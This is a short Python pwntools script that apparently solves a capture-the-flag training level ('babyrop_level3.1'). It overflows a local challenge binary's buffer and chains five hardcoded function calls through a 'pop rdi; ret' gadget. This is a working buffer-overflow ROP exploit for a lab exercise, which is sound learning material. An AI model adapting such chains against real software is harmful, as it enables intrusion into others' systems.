from pwn import *

context.arch="amd64"
p = process("/challenge/babyrop_level3.1")

def get_rop_byte(addrs:list, pop):
    bytes = b""
    g = 1
    for i in addrs:
        bytes += pop.to_bytes(8,"little") + g.to_bytes(8,"little") + i.to_bytes(8,"little")
        g+=1
    return bytes
elf = ELF("/challenge/babyrop_level3.1")
rop = ROP(elf)
addr = rop.find_gadget(['pop rdi', 'ret'])[0]

l = [0x40223B, 0x402079, 0x402159, 0x4023FA, 0x402317]
p.send(b"A"*0x68 + get_rop_byte(l, addr))
all = p.recvall()
print(all.decode())